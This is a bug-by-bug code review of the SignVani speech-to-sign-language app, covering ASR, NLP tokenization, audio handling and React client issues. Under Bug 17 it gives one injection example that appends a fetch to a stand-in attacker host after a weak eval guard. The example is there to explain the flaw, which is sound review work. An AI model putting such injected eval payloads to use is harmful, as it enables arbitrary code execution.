# SignVani Code Review — Logical Errors & Bugs

---

## 🔴 CRITICAL

---

### Bug 1 — `MIN_TOKEN_LENGTH = 2` silently drops the pronoun "I"

**File:** `nlp_backend/src/nlp/text_processor.py` + `nlp_backend/config/settings.py`

**Description:** `text_processor.py` lowercases all input first, turning "I" → `"i"` (length 1). Then the token filter rejects anything shorter than `MIN_TOKEN_LENGTH = 2`. The pronoun "I" is silently discarded and never reaches `grammar_transformer.py`. For the documented example "I am going to the market", the output is `"MARKET GO"` instead of `"I MARKET GO"`. This violates the core ISL SOV requirement.

```python
# settings.py
MIN_TOKEN_LENGTH: int = 2   # <-- length-1 tokens filtered

# text_processor.py — "i" (length 1) fails this check
if token and len(token) >= NLPConfig.MIN_TOKEN_LENGTH:
    clean_tokens.append(token)
```

**Severity:** Critical — the subject "I" is always dropped, breaking ISL grammar for all first-person sentences.

---

### Bug 2 — Audio sample rate mismatch: browser records at ≥44100 Hz, Vosk expects 16000 Hz

**File:** `client/src/Services/audioRecorder.js`

**Description:** The `getUserMedia` `sampleRate: 16000` constraint is advisory and browsers (especially Chrome/Safari) typically ignore it, recording at 44100 Hz or 48000 Hz. The `convertToWav` method writes the WAV header with `audioBuffer.sampleRate` (the actual rate). The backend then feeds this to Vosk, which was initialized with `KaldiRecognizer(model, 16000)`. Vosk receives data at the wrong rate and produces incorrect/garbage transcriptions.

```javascript
// audioRecorder.js – actual rate (44100 or 48000) stamped in header
view.setUint32(24, sampleRate, true);   // sampleRate = audioBuffer.sampleRate

// api_server.py – process_audio_file is a NO-OP, no resampling
async def process_audio_file(audio_content: bytes, content_type: str) -> bytes:
    return audio_content   # ← blindly returned regardless of rate
```

**Severity:** Critical — the entire speech-to-sign flow produces wrong or empty transcripts in production.

---

### Bug 3 — `VoskASR` in `vosk_integration.py` always falls back to `"hello world"`

**File:** `nlp_backend/src/asr/vosk_integration.py`

**Description:** `_get_default_model_path()` searches for `vosk-model-small-en-us-0.15`, but `setup_models.py` downloads `vosk-model-small-en-in-0.4` (configured in `settings.py`). Neither path matches, so `os.path.exists()` returns `False`, `self.model = None`, and every call to `transcribe_audio_file` falls through to `_placeholder_transcribe()` → returns the hard-coded string `"hello world"`. The `api_server.py` `/api/speech-to-sign` endpoint is completely broken.

```python
def _get_default_model_path(self) -> str:
    possible_paths = [
        "models/vosk-model-small-en-us-0.15",   # ← wrong model name
        ...
    ]
# settings.py has:  MODEL_NAME = 'vosk-model-small-en-in-0.4'

def _placeholder_transcribe(self) -> str:
    return "hello world"   # ← always returned since model never loads
```

**Severity:** Critical — the speech pathway via REST API always returns "hello world" silently.

---

### Bug 4 — `transcribe_audio_file` passes the entire audio in one `AcceptWaveform` call, gets only a partial result

**File:** `nlp_backend/src/asr/vosk_integration.py`

**Description:** Vosk's `AcceptWaveform` is designed for streaming small chunks. When fed an entire audio file at once (even for short sentences), it usually returns `False` (not a complete utterance). The code then reads `PartialResult()` instead of `FinalResult()`, so any actual transcription is truncated or empty. After the call, `FinalResult()` is never called to flush the remaining buffer.

```python
if recognizer.AcceptWaveform(audio_data):      # ← almost always False for full files
    result = json.loads(recognizer.Result())
    return result.get('text', '')
else:
    result = json.loads(recognizer.PartialResult())  # ← returns '' or fragment
    return result.get('partial', '')
    # FinalResult() is never called → audio is lost
```

**Severity:** Critical — even if Vosk loads correctly, transcription returns empty string for most real audio files.

---

## 🟠 HIGH

---

### Bug 5 — Contraction negations (e.g., "don't", "can't") are silently lost

**File:** `nlp_backend/src/nlp/text_processor.py` + `nlp_backend/src/nlp/grammar_transformer.py`

**Description:** NLTK tokenizes `"don't"` → `["do", "n't"]`. The `punctuation_map` removes `'` (apostrophe) from `"n't"` → `"nt"`. The `GrammarTransformer` checks `word_lower in NEGATION_WORDS` where `NEGATION_WORDS = {'no', 'not', 'never', "n't"}`. `"nt"` is not in that set, so the negation is silently dropped. "I don't eat" → `"EAT"` (no negation in output).

```python
# text_processor.py
token = token.translate(self.punctuation_map)   # "n't" → "nt"
# "nt" is not in NEGATION_WORDS → falls through as an object/subject

# grammar_transformer.py
NEGATION_WORDS = {'no', 'not', 'never', "n't"}   # ← "nt" never matches
```

**Severity:** High — negation is a semantic fundamental in ISL; its loss produces wrong/opposite meaning signs.

---

### Bug 6 — Punctuation sentinel tokens `<PERIOD>` etc. are split by the tokenizer and mishandled

**File:** `nlp_backend/src/nlp/text_processor.py`

**Description:** The code replaces `.` with ` <PERIOD> ` (uppercase) then lowercases it to `<period>`. NLTK's `word_tokenize` splits `<period>` on angle brackets into `['<', 'period', '>']`. The subsequent check `if token in ['<period>', ...]` is therefore never True. Instead, `'<'` and `'>'` are stripped by `punctuation_map`, and `"period"` (length 6) is kept as a literal word token. This word then gets POS-tagged as a noun and appears as a gloss in the output (e.g. `"PERIOD"`).

```python
text = text.replace('.', ' <PERIOD> ')   # step 1 – uppercase marker
text = text.lower().strip()              # step 0 – wait, lowercase is FIRST on line 75

# check is for split tokens: ['<', 'period', '>'] not the whole string
if token in ['<period>', '<question>', '<exclamation>', '<comma>']:
    ...  # ← never reached; "period" falls through as a real word
```

**Severity:** High — any sentence-ending period inserts a spurious `"PERIOD"` or `"QUESTION"` gloss into the ISL output.

---

### Bug 7 — Two separate Vosk model instances may be loaded simultaneously

**File:** `nlp_backend/src/asr/vosk_integration.py` + `nlp_backend/src/asr/vosk_engine.py`

**Description:** `VoskEngine` (singleton, used by the standalone pipeline) and `VoskASR` (used by `api_server.py` via `get_asr_engine()`) are completely unrelated classes. Both load a Vosk model independently. In any scenario where both are active, two full Vosk models are loaded, violating the `<500 MB RAM` constraint. `VoskASR` is not a singleton — each `get_asr_engine()` call will reuse the global variable, but if called before `asr_engine` is set it creates a second instance.

```python
# vosk_engine.py — proper singleton for the pipeline
class VoskEngine:
    _instance = None

# vosk_integration.py — separate global, non-thread-safe
asr_engine: Optional[VoskASR] = None
def get_asr_engine() -> VoskASR:
    global asr_engine
    if asr_engine is None:
        asr_engine = VoskASR()   # ← second model load
    return asr_engine
```

**Severity:** High — double memory consumption on the RPi4.

---

## 🟡 MEDIUM

---

### Bug 8 — `is_adj` variable and `adjectives` list are computed but never used

**File:** `nlp_backend/src/nlp/grammar_transformer.py`

**Description:** `adjectives = []` is declared and `is_adj = tag.startswith('JJ')` is computed, but neither is ever used. The `if/elif/else` chain only branches on `is_verb` vs. `state`. Adjectives fall silently into `subjects` (before verb) or `objects` (after verb). This means the `adjectives` list will always be empty, and the `is_adj` flag has no effect.

```python
adjectives = []     # ← initialized, never populated

is_adj = tag.startswith('JJ')   # ← computed, never branched on

if is_verb:
    verbs.append(word)
elif state == 0:
    subjects.append(word)   # adjectives land here
else:
    objects.append(word)    # or here

# isl_sequence never includes adjectives:
isl_sequence.extend(time_markers)
isl_sequence.extend(subjects)
isl_sequence.extend(objects)
isl_sequence.extend(verbs)   # ← no isl_sequence.extend(adjectives)
```

**Severity:** Medium — dead code obscuring intent; adjectives are not separately handled as designed.

---

### Bug 9 — Noise calibration blindly uses speech frames (VAD result ignored during calibration)

**File:** `nlp_backend/src/audio/audio_capture.py`

**Description:** During the first 10 audio frames (`_calibration_target = 10`), ALL frames are passed to `update_noise_profile()` regardless of the `is_speech` flag computed just above. If the user begins speaking immediately, speech spectral energy is baked into the noise profile. The noise filter then actively subtracts speech frequencies from subsequent utterances, degrading ASR quality.

```python
is_speech = self._vad.process_chunk(chunk)   # computed but ignored below

if self._is_calibrating:
    self._noise_filter.update_noise_profile(chunk.data)  # ← uses ALL frames
    ...
```

Should be: `if self._is_calibrating and not is_speech:`.

**Severity:** Medium — degrades ASR accuracy in practical use where early speech is present.

---

### Bug 10 — `CircularAudioBuffer.get()` busy-waits; `CircularAudioBuffer` itself is imported but unused

**File:** `nlp_backend/src/audio/audio_buffer.py` + `nlp_backend/src/audio/audio_capture.py`

**Description (part A):** The blocking `get()` method spins in a `while` loop sleeping 1 ms between attempts. At 16 kHz / 1024 frames, audio arrives every ~64 ms. This wastes ~63 unnecessary lock acquisitions per chunk — severe on RPi4.

```python
while self._is_active:
    with self._lock:
        if len(self._buffer) > 0:
            return self._buffer.popleft()
    time.sleep(0.001)   # ← busy poll, no condition variable
```

**Description (part B):** `CircularAudioBuffer` is imported in `audio_capture.py` but never instantiated. `AudioCaptureSystem` pushes chunks directly to a `queue.Queue`. The import is dead code.

```python
from src.audio.audio_buffer import CircularAudioBuffer   # imported, never used
```

**Severity:** Medium (performance-critical on RPi).

---

### Bug 11 — Stale `animate` closure when `speed` or `pause` changes mid-animation

**File:** `client/src/Hooks/useAnimationEngine.js`

**Description:** `animate` is memoized with `useCallback([ref, speed, pause, onTextUpdate])`. When `speed` or `pause` changes, a new `animate` function is created and `ref.animate` is updated via `useEffect`. However, any live `requestAnimationFrame` loop still holds a closure over the **old** `animate` (referenced by the `requestAnimationFrame(animate)` call inside it). The old function continues running with the stale `speed`/`pause` values until the animation queue is exhausted.

```javascript
// animate closes over 'speed' and 'pause' at creation time
const animate = useCallback(() => {
  ref.animationFrameId = requestAnimationFrame(animate);  // ← old closure captured
  bone[action][axis] += speed;     // ← stale speed
  setTimeout(() => { ... }, pause); // ← stale pause
}, [ref, speed, pause, onTextUpdate]);
```

**Severity:** Medium — speed/pause slider changes during animation are silently ignored until the next animation starts.

---

### Bug 12 — `React.createRef()` used instead of `useRef` for textarea refs in `Convert.js`

**File:** `client/src/Pages/Convert.js`

**Description:** `React.createRef()` creates a **new** ref object on every render. The sign functions capture the ref from a specific render's closure. Any async callback that captures a stale ref object (from a previous render) will lose the reference on the next render before the callback fires. The correct pattern for function components is `useRef`.

```javascript
let textFromAudio = React.createRef();   // ← new object each render
let textFromInput = React.createRef();   // ← new object each render

// onClick captures a specific render's ref object:
onClick={() => { sign(textFromInput) }}
```

**Severity:** Medium — works most of the time but breaks on fast re-renders or async interactions.

---

### Bug 13 — `MediaRecorder` `mimeType` has no fallback for Safari/Firefox variants

**File:** `client/src/Services/audioRecorder.js`

**Description:** `new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' })` throws a `DOMException` on Safari (all versions) and some Firefox configurations because `audio/webm` is unsupported. The `catch` in `initialize()` returns `false`, leaving `audioRecorderRef.current = null`. Every subsequent attempt to record produces an alert "Audio recorder not ready" with no guidance.

```javascript
this.mediaRecorder = new MediaRecorder(this.stream, {
  mimeType: 'audio/webm;codecs=opus'   // ← throws on Safari, no fallback
});
```

**Severity:** Medium — entire speech input feature silently broken on Safari.

---

## 🟢 LOW

---

### Bug 14 — `@lru_cache` on `get_hamnosys` uses un-normalized key; frequency updated only on first lookup

**File:** `nlp_backend/src/database/retriever.py`

**Description (part A):** `get_hamnosys("hello")` and `get_hamnosys("HELLO")` produce two separate cache entries because the LRU cache key is the raw argument (before `.upper().strip()` normalization inside the function). Callers that pass lowercase glosses bypass the cache.

**Description (part B):** `_update_frequency()` is called inside the cached function — it only runs on the first cache miss. All subsequent lookups hit the cache without updating frequency, making usage frequency statistics useless.

```python
@lru_cache(maxsize=database_config.CACHE_SIZE)
def get_hamnosys(self, gloss: str) -> Optional[str]:
    gloss = gloss.upper().strip()   # ← normalizes AFTER cache key is fixed
    ...
    self._update_frequency(conn, gloss)   # ← only ever called once per unique raw key
```

**Severity:** Low.

---

### Bug 15 — `get_connection` context manager returns connection to pool without rollback on error

**File:** `nlp_backend/src/database/db_manager.py`

**Description:** If a `sqlite3.Error` occurs between a DML statement and an explicit `conn.commit()`, the context manager returns the connection to the pool while it's in an uncommitted (dirty) transaction state. The next thread that borrows that connection may observe unexpected behavior.

```python
@contextmanager
def get_connection(self):
    conn = None
    try:
        conn = self.pool.get(timeout=5.0)
        yield conn
    except sqlite3.Error as e:
        raise DatabaseError(...)
    finally:
        if conn:
            self.pool.put(conn)   # ← no conn.rollback() before returning
```

**Severity:** Low.

---

### Bug 16 — `_is_calibrating` and `_calibration_frames` modified from two threads without a lock

**File:** `nlp_backend/src/audio/audio_capture.py`

**Description:** `_audio_callback` (PortAudio thread) reads/writes `_is_calibrating` and `_calibration_frames`. `reset_calibration()` (main thread) also writes them. Neither uses `self._lock`. Under the GIL this is unlikely to corrupt, but it is an unsynchronized write from two threads.

```python
# PortAudio callback thread:
self._calibration_frames += 1
if self._calibration_frames >= self._calibration_target:
    self._is_calibrating = False

# Main thread (no lock):
def reset_calibration(self):
    self._is_calibrating = True
    self._calibration_frames = 0
```

**Severity:** Low.

---

### Bug 17 — `evaluateExpression` uses `eval` with insufficient sanitization

**File:** `client/src/Animations/Utils/wordLoader.js`

**Description:** The guard `expr.includes('Math.PI')` only checks that the string contains the substring; it does not prevent execution of additional code appended after it (e.g., `"Math.PI; fetch('https://evil.example')"` would execute). The JSON data is bundled locally so the surface area is minimal, but the pattern is inherently unsafe.

```javascript
if (expr.includes('Math.PI')) {
    return eval(expr);   // ← no structural validation before eval
}
```

**Severity:** Low.

---

### Bug 18 — `evaluateExpression` silently returns `0` for unparseable numeric strings

**File:** `client/src/Animations/Utils/wordLoader.js`

**Description:** For any non-`Math.PI` string that is not a valid number, `parseFloat(expr)` returns `NaN`, and `NaN || 0` returns `0`. This silently sets the bone rotation target to `0` instead of surfacing an error, producing a wrong pose with no diagnostic output.

```javascript
return parseFloat(expr) || 0;   // NaN || 0 → 0 (silent wrong value)
```

**Severity:** Low.

---

### Bug 19 — `useEffect` in `useThreeScene` includes `ref` in dependency array unnecessarily

**File:** `client/src/Hooks/useThreeScene.js`

**Description:** `ref = componentRef.current` is always the same stable object (from `useRef`). Including `ref` in the deps array is a no-op but signals incorrect reasoning about what triggers re-initialisation.

```javascript
useEffect(() => {
  ...
}, [bot, canvasId, ..., ref]);   // ← ref never changes; harmless but incorrect
```

**Severity:** Low.

---

## Summary Table

| # | File | Severity | Issue |
|---|------|----------|-------|
| 1 | `text_processor.py` / `settings.py` | **Critical** | `MIN_TOKEN_LENGTH=2` drops pronoun "I" |
| 2 | `audioRecorder.js` / `api_server.py` | **Critical** | Browser records at 44100 Hz; Vosk gets wrong-rate audio |
| 3 | `vosk_integration.py` | **Critical** | Wrong model path → always returns `"hello world"` |
| 4 | `vosk_integration.py` | **Critical** | Single `AcceptWaveform` call on full file → partial/empty transcript |
| 5 | `text_processor.py` + `grammar_transformer.py` | **High** | Apostrophe strips `"n't"` → `"nt"`, negation lost |
| 6 | `text_processor.py` | **High** | `<PERIOD>` split by tokenizer → literal `"PERIOD"` appears in gloss |
| 7 | `vosk_integration.py` + `vosk_engine.py` | **High** | Two separate Vosk model instances loaded simultaneously |
| 8 | `grammar_transformer.py` | **Medium** | `adjectives` list and `is_adj` flag are dead code |
| 9 | `audio_capture.py` | **Medium** | Noise calibration uses speech frames, corrupting noise profile |
| 10 | `audio_buffer.py` + `audio_capture.py` | **Medium** | Busy-wait in `get()`; `CircularAudioBuffer` imported but never used |
| 11 | `useAnimationEngine.js` | **Medium** | Stale `animate` closure when `speed`/`pause` changes mid-animation |
| 12 | `Convert.js` | **Medium** | `React.createRef()` in function body; should be `useRef` |
| 13 | `audioRecorder.js` | **Medium** | No MIME fallback → silent failure on Safari |
| 14 | `retriever.py` | **Low** | `@lru_cache` key un-normalized; frequency only tracked once |
| 15 | `db_manager.py` | **Low** | Connection returned to pool without rollback on exception |
| 16 | `audio_capture.py` | **Low** | Calibration flags written from two threads without lock |
| 17 | `wordLoader.js` | **Low** | `eval` with insufficient guard |
| 18 | `wordLoader.js` | **Low** | `parseFloat(...) \|\| 0` silently returns `0` for invalid values |
| 19 | `useThreeScene.js` | **Low** | `ref` unnecessarily in `useEffect` deps |
